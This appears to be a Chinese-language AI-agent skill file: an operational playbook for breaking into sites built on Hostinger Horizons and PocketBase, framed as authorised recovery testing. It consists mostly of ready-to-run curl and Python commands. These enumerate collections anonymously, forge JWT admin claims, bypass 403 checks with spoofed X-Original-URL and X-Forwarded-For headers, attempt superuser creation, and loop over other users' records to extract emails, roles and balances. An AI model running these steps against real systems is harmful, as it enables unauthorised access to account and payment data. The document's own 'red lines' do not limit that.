---
name: 口袋库
description: >-
 授权目标上 Hostinger Horizons + PocketBase 的恢复/鉴权测试：业务 admin 与 PB 超管分流、
 集合规则误配（匿名读/登录写）、403 绕过与 BOLA/Mass Assignment 补测、安装向导锁定判断。
 
---

# PocketBase + Hostinger Horizons 恢复技能

## 何时启用

指纹：`X-Powered-By: Hostinger Horizons`、JS 中 `/hcgi/platform`、`/_/` PB Admin、集合 `banks/settings/platform_settings`。

## 两套后台（勿混淆）

| 入口 | 本质 | 常见结果 |
|------|------|----------|
| `/admin` | 前端硬编码密码 → `localStorage` | 仅 UI；写库靠 PB 规则 |
| `/hcgi/platform/_/` | `_superusers` JWT | 真超管：备份/SMTP/全用户/规则 |

## 强制顺序

1. **规则面**：未登录 list/view；登录 create/update/delete（勿改真实余额/伪造支付除非用户明确要求）。
2. **提权**：JWT none/claim 改写/弱 HMAC；`auth-refresh`→`_superusers`；mass assign `verified/role/collectionId`。
3. **403 绕过**（技能包 `401-403-bypass`）：trailing slash、大小写、双重编码、`X-Original-URL`、`X-Forwarded-For:127.0.0.1`、方法覆盖。
4. **BOLA**：跨 `userId` filter、他人 `bank_authorizations`、settings 多记录。
5. **安装向导**：`POST /api/collections/_superusers/records` → `403 Only superusers` = **已锁定**；`/#/pbinstall/{token}` 无日志 token 不可用；**不能**外网「重装接管」。
6. **服务器面**：CDN 常仅 80/443；宝塔/SSH 多半没有 → 转 **hPanel**。

## 红线

- 禁止弱口令海喷超管（429）。
- 超管邮箱 reset：**单次**、仅在已知可收信邮箱时。
- 探测记录创建后必须删除。

## 证据目录

`案卷/<site>/`：`STATUS.md`、`pb_deep/`、`pb_super*/`、`server_scan/`。

## 技能包对照（学以致用）

| 技能包 | 用于 PB 目标 |
|--------|----------------|
| `401-403-bypass-techniques` | `/api/settings` `/api/backups` `/_superusers` |
| `api-auth-and-jwt-abuse` | 用户票 vs 超管票、claim 篡改 |
| `api-authorization-and-bola` / `idor-*` | payments/users/banks 跨对象 |
| `race-condition` | 并行创建超管（通常仍 403） |
| `path-traversal-lfi` | `/api/files/...` |
| Nacos/S3/JWT_SECRET 链 | **非本栈**；见 SCG Playbook |

## 真源

- 手法：`传承/找回·站外.md`
- 工具：`python3 炼蛊房/core_web_surface_probe.py --help`

---

## 快速命令集

### Step 1：指纹确认

```bash
# 确认 Hostinger Horizons + PocketBase 指纹
curl -sk https://<目标>/ -I | grep -iE 'X-Powered-By|PocketBase|Horizons'
curl -sk https://<目标>/hcgi/platform/ -I | head -20
curl -sk https://<目标>/hcgi/platform/_/ -o /dev/null -w "%{http_code}" # 302 = PB Admin
```

### Step 2：集合规则探测（未登录 vs 登录）

```bash
# 未登录读（匿名读规则）
curl -sk https://<目标>/hcgi/platform/api/collections/users/records?page=1&perPage=5 \
 | python3 -m json.tool

# 常见集合名称枚举
for col in users payments orders banks platform_settings settings withdrawals deposits; do
 code=$(curl -sk -o /dev/null -w "%{http_code}" \
 "https://<目标>/hcgi/platform/api/collections/$col/records?page=1&perPage=1")
 echo "$code /api/collections/$col/records"
done
```

### Step 3：JWT 篡改尝试

```bash
# 登录获取 JWT（商户账号，若注册开放）
TOKEN=$(curl -sk https://<目标>/hcgi/platform/api/collections/users/auth-with-password \
 -X POST -H 'Content-Type: application/json' \
 -d '{"identity":"<已知邮箱>","password":"<已知密码>"}' \
 | python3 -c "import json,sys; d=json.load(sys.stdin); print(d.get('token',''))")
echo "Token: ${TOKEN:0:50}..."

# JWT 解码（检查 payload）
python3 -c "
import base64, json
token = '<JWT>'
parts = token.split('.')
payload = base64.b64decode(parts[1] + '==').decode(errors='replace')
print(json.loads(payload))
"

# 尝试 claim 篡改（isAdmin/role）
python3 -c "
import base64, json, hmac, hashlib
# 修改 payload
payload = {'userId': '<id>', 'email': '<email>', 'isAdmin': True, 'role': 'superadmin'}
new_payload = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b'=').decode()
print('Modified payload:', new_payload)
# 注意：需要知道 JWT Secret 才能生成有效签名
"
```

### Step 4：安装向导检测

```bash
# 检查超管集合是否可写（已锁定 = 安全）
curl -sk https://<目标>/hcgi/platform/api/collections/_superusers/records \
 -X POST -H 'Content-Type: application/json' \
 -d '{"email":"test@test.com","password":"Test@12345","passwordConfirm":"Test@12345"}' \
 | python3 -m json.tool
# 返回 "Only superusers" = 已锁定（正常）
# 返回 201 = 未锁定（严重漏洞）
```

### Step 5：403 绕过（针对 /api/settings 等管理接口）

```bash
# 尝试 trailing slash
curl -sk https://<目标>/hcgi/platform/api/settings/ | python3 -m json.tool

# X-Original-URL 绕过
curl -sk https://<目标>/hcgi/platform/api/admin-placeholder \
 -H 'X-Original-URL: /api/settings' | python3 -m json.tool

# X-Forwarded-For 本地 IP
curl -sk https://<目标>/hcgi/platform/api/settings \
 -H 'X-Forwarded-For: 127.0.0.1' \
 -H 'X-Real-IP: 127.0.0.1' | python3 -m json.tool

# 大小写变体
curl -sk https://<目标>/hcgi/platform/API/SETTINGS | python3 -m json.tool
```

### Step 6：BOLA 跨对象测试

```bash
# 枚举其他用户记录（修改 id）
for id in 1 2 3 4 5; do
 echo -n "User $id: "
 curl -sk "https://<目标>/hcgi/platform/api/collections/users/records/$id" \
 -H "Authorization: Bearer $TOKEN" \
 | python3 -m json.tool | grep -E 'email|role|balance|withdraw'
done

# 跨 userId 的 filter（payments 集合）
curl -sk "https://<目标>/hcgi/platform/api/collections/payments/records?filter=userId!='<自己的id>'" \
 -H "Authorization: Bearer $TOKEN" | python3 -m json.tool
```
